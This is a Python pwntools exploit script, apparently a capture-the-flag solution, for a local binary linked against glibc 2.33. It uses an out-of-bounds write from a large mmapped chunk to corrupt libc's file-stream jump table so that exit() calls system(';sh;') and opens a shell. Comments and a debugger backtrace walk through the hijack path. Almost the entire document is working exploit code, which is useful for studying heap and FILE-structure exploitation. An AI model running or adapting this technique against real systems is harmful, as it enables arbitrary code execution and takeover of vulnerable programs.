#!/usr/bin/env python3

from pwn import *

exe = ELF("vuln_patched")
libc = ELF("./libc-2.33.so")
ld = ELF("./ld-2.33.so")

context.binary = exe


def conn():
    r = process([exe.path])
    return r

r = conn()

def start_chunk(size):
    r.sendline(hex(size))

def write_at_offset(offset, c): # ex [100, 101, 102] ["A", "B", "C"]

    for i in range(len(offset)):
        r.sendline(hex(offset[i]) + " " + hex(ord(c[i])))

def main():
    
    pause()
    start_chunk(0x1400000)

    pause()
    r.sendline(hex(3+4))
    pause()

    #offset I need = 0x72f36

    write_at_offset([0x15c5350], ["\xe0"])
    write_at_offset([0x15c5350 + 1], ["\x2d"])
    write_at_offset([0x15c5350 + 2], ["\xe4"])

    write_at_offset([0x15c37f4 + 3], [";"])
    write_at_offset([0x15c37f4 + 2], ["h"])
    write_at_offset([0x15c37f4 + 1], ["s"])
    write_at_offset([0x15c37f4], [";"])

    # when exit() is called and you have oob write from mmaped chunk
    # you can change __GI__IO_file_sync inside __GI__IO_file_jumps+96 
    # When exit is called
    
    """
    [#0] 0x7ffff7e42de0 → system()
    [#1] 0x7ffff7e7c105 → _IO_default_setbuf()
    [#2] 0x7ffff7e78c3d → __GI__IO_file_setbuf()
    [#3] 0x7ffff7e7cb3c → _IO_cleanup()
    [#4] 0x7ffff7e385a2 → __run_exit_handlers()
    [#5] 0x7ffff7e3864e → exit()
    [#6] 0x55555555531b → main()

    """

    r.interactive()


if __name__ == "__main__":
    main()
